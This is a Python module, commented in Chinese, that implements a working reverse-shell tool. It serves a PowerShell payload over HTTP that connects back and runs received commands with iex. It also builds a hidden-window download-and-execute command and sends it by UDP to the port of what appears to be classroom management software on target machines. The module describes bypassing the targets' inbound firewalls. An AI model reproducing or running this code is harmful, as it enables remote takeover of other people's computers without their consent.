"""反弹终端：本机监听端口，让目标主动连回来形成交互式命令行。

远程命令通道一条报文只装得下一百多个字符，完整的 PowerShell 反弹脚本塞不进
去，所以脚本由本机内置的小型 HTTP 服务提供，下发的命令只负责下载并执行它。
目标连回来的是它自己发起的出站连接，因此不受目标入站防火墙限制。
"""

import socket
import threading
from contextlib import suppress
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

from . import protocol
from .constants import COMMAND_MAX_BYTES
from .local_info import detect_local_ip

# 命令通道按 UTF-16 单元计数，超出的部分会被拒绝，所以下发前先量一下长度。
MAX_COMMAND_CHARS = COMMAND_MAX_BYTES // 2
# 脚本路径取短名，把命令长度留给地址与端口。
SCRIPT_PATH = "/s.ps1"
# 目标回连通常几秒内完成，留够手工点按钮的余量。
ACCEPT_TIMEOUT = 0.5
READ_SIZE = 8192


def payload_script(host, port):
    """返回远端执行的 PowerShell 脚本。

    脚本把每条收到的命令交给 ``iex`` 执行，再把输出写回同一条连接，
    所以整段会话只需要目标发起一次出站连接。

    Args:
        host: 本机地址，也就是目标要连回来的地址。
        port: 本机监听的 TCP 端口。

    Returns:
        str: 脚本全文。
    """
    return (
        "$ErrorActionPreference='SilentlyContinue'\n"
        "$c=New-Object Net.Sockets.TCPClient('%s',%d)\n"
        "$s=$c.GetStream()\n"
        "$e=New-Object System.Text.ASCIIEncoding\n"
        "$b=New-Object byte[] %d\n"
        "while(($i=$s.Read($b,0,%d)) -ne 0){\n"
        "  $r=(iex $e.GetString($b,0,$i) 2>&1 | Out-String) + 'PS> '\n"
        "  $x=$e.GetBytes($r)\n"
        "  $s.Write($x,0,$x.Length)\n"
        "  $s.Flush()\n"
        "}\n"
        "$c.Close()\n" % (host, port, READ_SIZE, READ_SIZE)
    )


def connect_command(host, http_port, path=SCRIPT_PATH):
    """返回下发给目标的命令：下载脚本并立即执行。

    Args:
        host: 本机地址。
        http_port: 提供脚本的 HTTP 端口。
        path: 脚本路径。

    Returns:
        str: 可以直接走远程命令通道的一条命令。
    """
    return (
        'powershell -w hidden -c "IEX(New-Object Net.WebClient)'
        ".DownloadString('http://%s:%d%s')\"" % (host, http_port, path)
    )


class _ScriptHandler(BaseHTTPRequestHandler):
    """把反弹脚本发给目标，任何路径都返回同一份脚本。"""

    owner = None

    def do_GET(self):
        """返回脚本正文。"""
        body = self.owner.script().encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *_args):
        """脚本下载属于内部动作，不往控制台打访问日志。"""


class ShellServer:
    """监听目标回连的 TCP 端口，并提供脚本下载服务。

    Attributes:
        bind_ip: 监听地址，默认限制在全部网卡。
        local_ip: 目标用来回连的本机地址，留空时自动探测。
    """

    def __init__(self, bind_ip="0.0.0.0", port=0, local_ip=None):
        self.bind_ip = bind_ip
        self.local_ip = local_ip or ""
        self._socket = None
        self._http = None
        self._client = None
        self._thread = None
        self._reader = None
        self._lock = threading.Lock()
        self._output = []
        self._address = ""
        self._port = int(port)
        self._http_port = 0
        self._closed = False

    @property
    def port(self):
        """返回实际监听的 TCP 端口，未启动时为配置值。"""
        return self._port

    @property
    def http_port(self):
        """返回脚本服务的 HTTP 端口，未启动时为 0。"""
        return self._http_port

    @property
    def connected(self):
        """返回目标是否已连上。"""
        with self._lock:
            return self._client is not None

    @property
    def address(self):
        """返回已连接目标的地址，未连接时为空串。"""
        with self._lock:
            return self._address

    def start(self):
        """开始监听，并启动脚本服务。

        Returns:
            ShellServer: 自身，便于链式调用。

        Raises:
            OSError: 端口被占用或无权限绑定。
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            sock.bind((self.bind_ip, self._port))
            sock.listen(1)
        except OSError:
            sock.close()
            raise
        sock.settimeout(ACCEPT_TIMEOUT)
        self._socket = sock
        self._port = sock.getsockname()[1]
        self._closed = False
        self._start_http()
        self._thread = threading.Thread(target=self._accept_loop, daemon=True)
        self._thread.start()
        self._push("正在 %s:%d 等待目标连回…" % (self.bind_ip, self._port))
        return self

    def script(self):
        """返回当前要发的脚本，地址与端口按实际监听值生成。"""
        return payload_script(self.callback_host(), self._port)

    def callback_host(self):
        """返回目标回连用的本机地址。"""
        return self.local_ip or detect_local_ip()

    def command(self):
        """返回下发给目标的连接命令。

        Returns:
            str: 一条可以直接通过远程命令通道发送的命令。

        Raises:
            ValueError: 服务尚未启动，或命令超出报文容量。
        """
        if not self._http_port:
            raise ValueError("请先开始监听，再生成连接命令")
        text = connect_command(self.callback_host(), self._http_port)
        if len(text) > MAX_COMMAND_CHARS:
            raise ValueError(
                "连接命令超过远程命令通道容量（%d 个字符）" % MAX_COMMAND_CHARS
            )
        return text

    def poll(self):
        """取出并清空这段时间新增的输出。"""
        with self._lock:
            data = "".join(self._output)
            self._output.clear()
        return data

    def send(self, text):
        """把一条命令发给目标。

        Args:
            text: 命令文本；未以换行结尾时自动补一个。

        Returns:
            bool: 目标已连接并写出成功返回 True。
        """
        with self._lock:
            client = self._client
        if client is None:
            return False
        payload = text if text.endswith("\n") else text + "\r\n"
        try:
            client.sendall(payload.encode("utf-8"))
        except OSError as error:
            self._push("\n发送失败：%s\n" % error)
            return False
        return True

    def close(self):
        """断开目标并停止监听。"""
        if self._closed:
            return
        self._closed = True
        with self._lock:
            client = self._client
            self._client = None
            self._address = ""
        if client is not None:
            with suppress(OSError):
                client.close()
        if self._socket is not None:
            with suppress(OSError):
                self._socket.close()
            self._socket = None
        if self._http is not None:
            self._http.shutdown()
            self._http.server_close()
            self._http = None
        self._push("\n监听已停止\n")

    def _start_http(self):
        """启动只提供脚本的小型 HTTP 服务。"""
        handler = type("_Handler", (_ScriptHandler,), {"owner": self})
        http = ThreadingHTTPServer((self.bind_ip, 0), handler)
        http.daemon_threads = True
        self._http = http
        self._http_port = http.server_address[1]
        threading.Thread(target=http.serve_forever, daemon=True).start()

    def _accept_loop(self):
        """等待目标连回，并把后续读取放到独立线程。"""
        # 先把监听套接字留住，关闭时它会被置空，循环里再取会拿到 None。
        listener = self._socket
        while not self._closed:
            try:
                client, address = listener.accept()
            except socket.timeout:
                continue
            except OSError:
                return
            with self._lock:
                self._client = client
                self._address = "%s:%d" % (address[0], address[1])
            client.settimeout(None)
            self._push("\n目标已连回：%s\n" % self._address)
            self._reader = threading.Thread(
                target=self._read_loop, args=(client,), daemon=True
            )
            self._reader.start()
            return

    def _read_loop(self, client):
        """持续读取目标输出，直到连接断开。"""
        while not self._closed:
            try:
                data = client.recv(READ_SIZE)
            except OSError:
                break
            if not data:
                break
            self._push(_decode(data))
        with self._lock:
            if self._client is client:
                self._client = None
        self._push("\n连接已断开\n")

    def _push(self, text):
        with self._lock:
            self._output.append(text)


def _decode(data):
    """把目标输出解成文本：控制台默认 GBK，也兼容 UTF-8。"""
    try:
        return data.decode("utf-8")
    except UnicodeDecodeError:
        return data.decode("gbk", errors="replace")


def send_command(host, command, port=4705, local_ip=None, report=None):
    """把一条远程命令单播给目标。

    Args:
        host: 目标地址。
        command: 命令文本，超出报文容量会抛异常。
        port: 学生端 UDP 端口。
        local_ip: 组播出口地址，可省略。
        report: 进度回调。

    Returns:
        int: 发送的字节数。
    """
    packet = bytes(protocol.pkg_sendlist("-c", command))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        if local_ip:
            sock.setsockopt(
                socket.IPPROTO_IP, socket.IP_MULTICAST_IF, socket.inet_aton(local_ip)
            )
        sent = sock.sendto(packet, (host, port))
    finally:
        sock.close()
    if report:
        report("远程命令 → %s（%d 字节）" % (host, sent))
    return sent
